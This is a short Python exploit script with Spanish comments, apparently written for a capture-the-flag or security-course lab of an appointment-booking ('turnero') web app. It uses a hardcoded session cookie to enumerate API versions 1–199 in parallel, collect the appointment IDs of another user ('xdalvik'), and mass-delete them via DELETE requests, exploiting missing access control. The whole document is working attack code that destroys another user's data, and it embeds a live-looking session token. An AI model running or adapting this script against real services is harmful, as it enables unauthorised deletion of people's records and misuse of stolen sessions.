import requests
from concurrent.futures import ThreadPoolExecutor

# URL base para buscar y eliminar
url_template_get = "https://chl-038d9954-2440-4dbc-83a6-d3938b39833a-turnero.softwareseguro.com.ar/api/{}/appointments/"
url_template_delete = "https://chl-038d9954-2440-4dbc-83a6-d3938b39833a-turnero.softwareseguro.com.ar/api/appointments/{}"

# Cabeceras comunes
headers = {
    "Host": "chl-038d9954-2440-4dbc-83a6-d3938b39833a-turnero.softwareseguro.com.ar",
    "Cookie": "_ga=GA1.3.752036958.1743859339; _gid=GA1.3.151983393.1743859339; session=.eJwljkEKAyEMAP_iuYckamL2M4sxkfbqdk-lf69Q5jYwMJ90zhXXMx3vdccjnS9PR6IuDJvG4bXXPJxVqIhagCs45kB2ZujTslSWMAUFDBzY2CbarGYynHIGKzC3JnJosDUJtTE126COmHGK77A4N61iRZUw7ZH7ivW_wfT9AXE7Ljk.Z_FvEQ.92BwzBQH1YiIJiyBuMHCkTA06GM",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
}

# Lista para almacenar los IDs encontrados
ids_encontrados = []

# Función para buscar los IDs del usuario "xdalvik"
def buscar_ids(api_version):
    url = url_template_get.format(api_version)
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            for appointment in response.json():
                if appointment.get("user") == "xdalvik":
                    ids_encontrados.append(appointment.get("id"))
                    print(f"ID encontrado: {appointment.get('id')} en API Version {api_version}")
    except Exception as e:
        print(f"Error al buscar en API Version {api_version}: {e}")

# Función para eliminar un ID
def eliminar_id(appointment_id):
    url = url_template_delete.format(appointment_id)
    try:
        response = requests.delete(url, headers=headers)
        if response.status_code == 200:
            print(f"ID {appointment_id} eliminado correctamente.")
        else:
            print(f"Error al eliminar ID {appointment_id}: Código de estado {response.status_code}")
    except Exception as e:
        print(f"Error al eliminar ID {appointment_id}: {e}")

# Buscar IDs en paralelo
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(buscar_ids, range(1, 200))  # Cambia el rango según sea necesario

# Eliminar los IDs encontrados en paralelo
if ids_encontrados:
    print(f"IDs encontrados: {ids_encontrados}")
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(eliminar_id, ids_encontrados)
else:
    print("No se encontraron IDs para eliminar.")